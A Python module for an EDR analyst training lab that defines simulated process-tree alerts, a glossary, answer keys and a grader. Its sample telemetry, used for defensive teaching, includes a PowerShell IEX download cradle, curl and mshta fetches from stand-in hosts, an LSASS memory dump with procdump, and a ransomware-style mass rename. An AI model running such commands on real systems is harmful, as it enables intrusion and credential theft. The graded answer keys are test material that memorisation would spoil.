"""
G4 — EDR console simulation (process tree, isolate decision, prove-it).

Vendor-agnostic Boundry samples. Not Defender/Falcon UI clones.
Show me tree → Help me decide → Prove it with isolate + disposition.
"""

from __future__ import annotations

from typing import Any

import career_instances
import career_rationale

TRACK_TITLE = "EDR Console Lab"
TRACK_BLURB = (
    "Practice reading a process tree the way a Tier-1 analyst does in an endpoint "
    "detection and response (EDR) console. Decide whether to isolate the host, "
    "and write a short prove-it disposition. Terms are defined before they are used."
)

PASS_PCT = 70

PRIMER = [
    {
        "term": "EDR",
        "plain": "Endpoint Detection and Response: software on endpoints that records process activity and helps analysts contain threats.",
    },
    {
        "term": "Process tree",
        "plain": "A parent→child view of which program started which. Malware often hides under a trusted parent (for example Excel launching PowerShell).",
    },
    {
        "term": "Isolate host",
        "plain": "Cut the endpoint off the network (except to the EDR console) so malware cannot spread while you investigate.",
    },
    {
        "term": "False positive",
        "plain": "An alert that looks suspicious but is expected or authorized activity. Isolating would hurt the business for no security gain.",
    },
    {
        "term": "MSI",
        "plain": "Microsoft Installer package: a .msi file Windows uses to install or update software. msiexec.exe is the Windows program that runs those packages.",
    },
    {
        "term": "CCM / SCCM",
        "plain": "Client (or Configuration) Manager cache from Microsoft Endpoint Configuration Manager, often still called SCCM. IT uses it to push patches. CcmExec.exe is the agent. C:\\Windows\\CCM\\Cache holds installer files it already downloaded.",
    },
]

# How to read Boundry's EDR console lines (vendor UIs use the same ideas with different labels).
CONSOLE_LEGEND = {
    "title": "How to read this console (every line)",
    "intro": (
        "Real EDR products (Defender, CrowdStrike, SentinelOne, and others) all show a "
        "process tree. Labels differ. The ideas below transfer. Learn this format once, "
        "then you can read almost any console."
    ),
    "example_line": "  ! [7740] powershell.exe  powershell.exe -NoP -Enc JABzAD0A...",
    "fields": [
        {
            "label": "Indent (spaces at the start)",
            "plain": (
                "Shows parent and child. Deeper indent means this process was started by "
                "the process above it. Walk the tree top to bottom: who launched whom."
            ),
        },
        {
            "label": "! or blank (first column)",
            "plain": (
                "In this Boundry lab, ! means the sample flags that node as suspicious. "
                "A blank space means not flagged. Real consoles use colors, severity icons, "
                "or alert badges for the same idea."
            ),
        },
        {
            "label": "[PID] — process ID",
            "plain": (
                "A number Windows gave this running program. Unique on that host for that "
                "moment. You use it when talking to Tier-2 (“PID 7740 under Excel”)."
            ),
        },
        {
            "label": "Process name (for example powershell.exe)",
            "plain": (
                "The executable file name. Ask: is this a normal child for the parent? "
                "Excel → powershell.exe is often bad. CcmExec.exe → msiexec.exe is often IT patching."
            ),
        },
        {
            "label": "Command line (everything after the name)",
            "plain": (
                "How the program was started: paths, flags, URLs, scripts. This is where "
                "malware often shows itself (-Enc, -w hidden, http:// downloads, odd Temp paths). "
                "Always read the command line, not only the process name."
            ),
        },
        {
            "label": "Host",
            "plain": "Which machine generated the alert (for example WS-HR-03).",
        },
        {
            "label": "User",
            "plain": (
                "Which account was tied to the activity. SYSTEM or an IT service account "
                "can mean management tools. A normal user under Office → shell is riskier."
            ),
        },
        {
            "label": "Parent vs child (how the tree is built)",
            "plain": (
                "Each process has a parent process ID (PPID) behind the scenes. Boundry "
                "draws that as indent. Real consoles may show a “Parent” column or a graph. "
                "Same question: what started this, and does that relationship make sense?"
            ),
        },
    ],
    "read_order": [
        "Read Host and User first (where / who).",
        "Find the top of the tree, then walk down each indent level.",
        "For every line: name, then command line, then whether ! (or a vendor badge) is set.",
        "Ask: is this child normal for this parent? Does the command line look like IT work or attacker tradecraft?",
        "Only then decide isolate vs false positive.",
    ],
}


def _case(
    cid: str,
    title: str,
    difficulty: int,
    host: str,
    user: str,
    tree: list[dict[str, Any]],
    isolate: bool,
    disposition: str,
    teach: str,
    checklist: dict[str, bool],
) -> dict[str, Any]:
    return {
        "id": cid,
        "title": title,
        "difficulty": difficulty,
        "host": host,
        "user": user,
        "tree": tree,
        "correct_isolate": isolate,
        "correct_disposition": disposition,
        "teach": teach,
        "checklist_answers": checklist,
    }


CASES: list[dict[str, Any]] = [
    _case(
        "excel_ps_enc",
        "Excel → encoded PowerShell",
        1,
        "WS-HR-03",
        "j.patel",
        [
            {"pid": 4100, "ppid": 880, "name": "explorer.exe", "cmd": "C:\\Windows\\explorer.exe", "suspicious": False},
            {"pid": 5204, "ppid": 4100, "name": "OUTLOOK.EXE", "cmd": "OUTLOOK.EXE", "suspicious": False},
            {
                "pid": 6612,
                "ppid": 5204,
                "name": "EXCEL.EXE",
                "cmd": "EXCEL.EXE /e \"C:\\Users\\j.patel\\Downloads\\Invoice_44102.xlsm\"",
                "suspicious": True,
            },
            {
                "pid": 7740,
                "ppid": 6612,
                "name": "powershell.exe",
                "cmd": "powershell.exe -NoP -Enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgALi4u",
                "suspicious": True,
            },
            {
                "pid": 8012,
                "ppid": 7740,
                "name": "curl.exe",
                "cmd": "curl.exe -o %TEMP%\\u.exe http://203.0.113.88/u.exe",
                "suspicious": True,
            },
        ],
        True,
        "isolate_escalate",
        "Office parent spawning encoded PowerShell then a download is classic malware. Isolate, escalate, preserve evidence.",
        {
            "office_spawned_shell": True,
            "encoded_or_download": True,
            "isolate_needed": True,
        },
    ),
    _case(
        "sccm_patch",
        "SCCM agent patch install",
        1,
        "WS-FINANCE-12",
        "SYSTEM",
        [
            {"pid": 900, "ppid": 4, "name": "services.exe", "cmd": "C:\\Windows\\System32\\services.exe", "suspicious": False},
            {
                "pid": 2204,
                "ppid": 900,
                "name": "CcmExec.exe",
                "cmd": "C:\\Windows\\CCM\\CcmExec.exe",
                "suspicious": False,
            },
            {
                "pid": 3400,
                "ppid": 2204,
                "name": "msiexec.exe",
                "cmd": "msiexec.exe /i \"C:\\Windows\\CCM\\Cache\\KB5034441.msi\" /quiet",
                "suspicious": False,
            },
        ],
        False,
        "close_fp",
        (
            "This looks like IT patching, not malware. "
            "CcmExec.exe is the Microsoft Endpoint Configuration Manager agent "
            "(still often called SCCM). It starts msiexec.exe, which installs an "
            "MSI (a Windows .msi installer package) from the CCM Cache folder "
            "(C:\\Windows\\CCM\\Cache), where the agent stores packages it already "
            "downloaded. The /quiet flag means install with no user prompts. "
            "A known management agent installing a quiet MSI from that cache "
            "during a patch window is expected activity. Close as a false positive; "
            "do not isolate."
        ),
        {
            "office_spawned_shell": False,
            "encoded_or_download": False,
            "isolate_needed": False,
        },
    ),
    _case(
        "lolbin_mshta",
        "Browser → mshta → script",
        2,
        "WS-MKT-07",
        "a.chen",
        [
            {"pid": 3100, "ppid": 4100, "name": "msedge.exe", "cmd": "msedge.exe", "suspicious": False},
            {
                "pid": 5520,
                "ppid": 3100,
                "name": "mshta.exe",
                "cmd": "mshta.exe http://phish.example/upd.hta",
                "suspicious": True,
            },
            {
                "pid": 6100,
                "ppid": 5520,
                "name": "cmd.exe",
                "cmd": "cmd.exe /c powershell -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://phish.example/a.ps1')",
                "suspicious": True,
            },
        ],
        True,
        "isolate_escalate",
        "Living-off-the-land: browser to mshta to hidden PowerShell download. Isolate host and escalate.",
        {
            "office_spawned_shell": False,
            "encoded_or_download": True,
            "isolate_needed": True,
        },
    ),
    _case(
        "it_remote_assist",
        "Helpdesk remote assist (approved)",
        2,
        "WS-OPS-02",
        "helpdesk.svc",
        [
            {"pid": 1800, "ppid": 900, "name": "svchost.exe", "cmd": "svchost.exe -k netsvcs", "suspicious": False},
            {
                "pid": 4400,
                "ppid": 1800,
                "name": "QuickAssist.exe",
                "cmd": "QuickAssist.exe",
                "suspicious": False,
            },
            {
                "pid": 5100,
                "ppid": 4400,
                "name": "powershell.exe",
                "cmd": "powershell.exe -File C:\\IT\\Scripts\\CollectDiag.ps1",
                "suspicious": False,
            },
        ],
        False,
        "close_fp",
        "Ticket INC-8821: helpdesk ran CollectDiag.ps1 via Quick Assist. Path and parent match the change note. Close FP; do not isolate.",
        {
            "office_spawned_shell": False,
            "encoded_or_download": False,
            "isolate_needed": False,
        },
    ),
    _case(
        "lsass_dump",
        "Suspicious LSASS access (credential dump)",
        2,
        "WS-IT-02",
        "unknown",
        [
            {"pid": 668, "ppid": 4, "name": "lsass.exe", "cmd": "C:\\Windows\\System32\\lsass.exe", "suspicious": False},
            {
                "pid": 9020,
                "ppid": 880,
                "name": "procdump.exe",
                "cmd": "procdump.exe -ma lsass.exe C:\\Users\\Public\\lsass.dmp",
                "suspicious": True,
            },
        ],
        True,
        "isolate_escalate",
        "Dumping LSASS memory is credential theft. Isolate, escalate to IR, and preserve the dump path. Do not treat as a normal admin tool without a change ticket.",
        {
            "office_spawned_shell": False,
            "encoded_or_download": False,
            "isolate_needed": True,
        },
    ),
    _case(
        "ransomware_rename",
        "Mass file rename + ransom note",
        1,
        "WS-FINANCE-12",
        "j.patel",
        [
            {
                "pid": 7100,
                "ppid": 4100,
                "name": "wscript.exe",
                "cmd": "wscript.exe C:\\Users\\j.patel\\AppData\\Local\\Temp\\upd.vbs",
                "suspicious": True,
            },
            {
                "pid": 7200,
                "ppid": 7100,
                "name": "cmd.exe",
                "cmd": "cmd.exe /c ren *.docx *.docx.locked & echo READ_ME.txt",
                "suspicious": True,
            },
        ],
        True,
        "isolate_escalate",
        "Mass rename plus a ransom note pattern is ransomware behavior. Isolate immediately and escalate. Do not wait for a clean hash.",
        {
            "office_spawned_shell": False,
            "encoded_or_download": True,
            "isolate_needed": True,
        },
    ),
    _case(
        "defender_update_fp",
        "Defender definition update (signed)",
        1,
        "WS-OPS-02",
        "SYSTEM",
        [
            {
                "pid": 2100,
                "ppid": 900,
                "name": "MsMpEng.exe",
                "cmd": "C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\MsMpEng.exe",
                "suspicious": False,
            },
            {
                "pid": 2300,
                "ppid": 2100,
                "name": "MpCmdRun.exe",
                "cmd": "MpCmdRun.exe -SignatureUpdate",
                "suspicious": False,
            },
        ],
        False,
        "close_fp",
        "Microsoft Defender updating signatures under MsMpEng is expected. Close as false positive; do not isolate the host for a signed AV update.",
        {
            "office_spawned_shell": False,
            "encoded_or_download": False,
            "isolate_needed": False,
        },
    ),
    _case(
        "psexec_lateral",
        "PsExec service on peer workstation",
        2,
        "WS-FINANCE-12",
        "svc_admin",
        [
            {
                "pid": 1200,
                "ppid": 668,
                "name": "services.exe",
                "cmd": "C:\\Windows\\System32\\services.exe",
                "suspicious": False,
            },
            {
                "pid": 8800,
                "ppid": 1200,
                "name": "PSEXESVC.exe",
                "cmd": "C:\\Windows\\PSEXESVC.exe",
                "suspicious": True,
            },
            {
                "pid": 8900,
                "ppid": 8800,
                "name": "cmd.exe",
                "cmd": "cmd.exe /c whoami & net user",
                "suspicious": True,
            },
        ],
        True,
        "isolate_escalate",
        "Unexpected PsExec service plus recon commands is lateral movement until proven as a ticketed admin job. Isolate and escalate.",
        {
            "office_spawned_shell": False,
            "encoded_or_download": False,
            "isolate_needed": True,
        },
    ),
]

DISPOSITIONS = [
    {
        "id": "isolate_escalate",
        "label": "Isolate host and escalate to IR / Tier-2",
        "why": "Malicious chain with network risk. Contain first, then hand off.",
    },
    {
        "id": "monitor_only",
        "label": "Watch only (no isolate, no close)",
        "why": "Rarely right for clear malware trees. Monitoring alone lets spread continue.",
    },
    {
        "id": "close_fp",
        "label": "Close as false positive / expected activity",
        "why": "Authorized tooling or known ops path with no malicious indicators.",
    },
    {
        "id": "reimage_now",
        "label": "Wipe and reimage immediately without isolate",
        "why": "Wrong order for L1: isolate and escalate first; reimage is an IR decision.",
    },
]

CHECKLIST_ITEMS = [
    {
        "id": "office_spawned_shell",
        "label": "Office or browser parent spawned a shell / scripting host (PowerShell, cmd, mshta)",
    },
    {
        "id": "encoded_or_download",
        "label": "Encoded command, hidden window, or download-to-disk pattern is present",
    },
    {
        "id": "isolate_needed",
        "label": "Host should be isolated now (network cut) before deeper investigation",
    },
]


def case_ids() -> list[str]:
    """Ordered case ids for next-scenario rotation."""
    return [c["id"] for c in CASES]


def list_cases() -> list[dict[str, Any]]:
    """Hub cards without full trees (pattern titles; host varies per open)."""
    return [
        {
            "id": c["id"],
            "title": c["title"],
            "difficulty": c["difficulty"],
            "teach": c["teach"],
        }
        for c in CASES
    ]


def get_case(case_id: str) -> dict[str, Any] | None:
    """Return one EDR case including process tree (canonical, no variants)."""
    for c in CASES:
        if c["id"] == case_id:
            return c
    return None


def materialize_case(case_id: str, seed: str | None = None) -> dict[str, Any] | None:
    """Return a variant instance: new host/user/paths/IPs/PIDs; answers unchanged."""
    case = get_case(case_id)
    if not case:
        return None
    return career_instances.materialize_generic(
        case,
        seed,
        host_key="host",
        user_key="user",
        text_keys=["teach"],
        allow_ip=True,
        remap_tree_pids=True,
    )


def next_after(case_id: str) -> dict[str, str]:
    """Random different case + fresh seed URL under /career/edr."""
    return career_instances.next_scenario(case_ids(), case_id, "/career/edr")


def format_tree_lines(tree: list[dict[str, Any]]) -> list[str]:
    """Indent process tree lines for display (depth by parent chain)."""
    by_pid = {n["pid"]: n for n in tree}
    roots = [n for n in tree if n["ppid"] not in by_pid]
    if not roots:
        roots = tree[:1]
    lines: list[str] = []

    def walk(node: dict[str, Any], depth: int) -> None:
        mark = "!" if node.get("suspicious") else " "
        pad = "  " * depth
        lines.append(
            f"{pad}{mark} [{node['pid']}] {node['name']}  {node.get('cmd') or ''}"
        )
        kids = [n for n in tree if n["ppid"] == node["pid"]]
        for k in kids:
            walk(k, depth + 1)

    for r in roots:
        walk(r, 0)
    return lines


def grade_edr(
    case_id: str,
    checklist: dict[str, bool],
    isolate: bool,
    disposition: str,
) -> dict[str, Any]:
    """Grade checklist + isolate decision + disposition."""
    case = get_case(case_id)
    if not case:
        return {"ok": False, "error": "Unknown case"}
    answers = case["checklist_answers"]
    items = []
    hit = 0
    for item in CHECKLIST_ITEMS:
        iid = item["id"]
        expected = bool(answers.get(iid))
        got = bool(checklist.get(iid))
        ok = got == expected
        if ok:
            hit += 1
        items.append({
            "id": iid,
            "label": item["label"],
            "expected": expected,
            "got": got,
            "correct": ok,
        })
    isolate_ok = bool(isolate) == bool(case["correct_isolate"])
    disp_ok = (disposition or "").strip() == case["correct_disposition"]
    # Checklist 3 + isolate 2 + disposition 2
    score = hit + (2 if isolate_ok else 0) + (2 if disp_ok else 0)
    total = len(CHECKLIST_ITEMS) + 4
    pct = round(100 * score / total)
    disp_meta = next(
        (d for d in DISPOSITIONS if d["id"] == case["correct_disposition"]),
        None,
    )
    isolate_label = "Isolate: YES" if case["correct_isolate"] else "Isolate: NO"
    isolate_why = (
        "Contain the host before spread when the process tree shows malware / C2 risk."
        if case["correct_isolate"]
        else "Do not isolate when evidence points to expected IT tooling or a clear FP."
    )
    return {
        "ok": True,
        "pct": pct,
        "passed": pct >= PASS_PCT,
        "checklist": items,
        "isolate_correct": isolate_ok,
        "correct_isolate": case["correct_isolate"],
        "disposition_correct": disp_ok,
        "correct_disposition": case["correct_disposition"],
        "teach": case["teach"],
        "score": score,
        "total": total,
        "answer_chips": [
            career_rationale.chip(
                id="isolate",
                label=isolate_label,
                matched=isolate_ok,
                rationale=f"{isolate_why} For this case: {case['teach']}",
                title="Why this isolate choice",
                row_label="Correct isolate decision",
            ),
            career_rationale.disposition_chip(
                correct_id=case["correct_disposition"],
                label=(disp_meta or {}).get("label") or case["correct_disposition"],
                matched=disp_ok,
                teach=case["teach"],
                why=(disp_meta or {}).get("why") or "",
            ),
        ],
    }
